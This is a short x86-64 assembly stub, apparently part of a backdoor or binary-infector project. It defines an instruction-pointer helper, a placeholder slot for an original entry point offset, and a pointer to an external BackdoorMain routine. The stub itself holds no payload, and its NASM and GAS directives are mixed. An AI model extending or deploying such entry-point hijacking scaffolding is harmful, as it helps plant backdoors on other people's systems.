[bits 64]
[org 0]

.section .text


global get_rip
global OriginalEntryPoint_offset
extern BackdoorMain

get_rip:
    call _next
_next:
    pop rax
    ret

.section .data

[align 8]
OriginalEntryPoint_offset: dq 0x1234567890abcdef
BackdoorEntrypoint: dq BackdoorMain
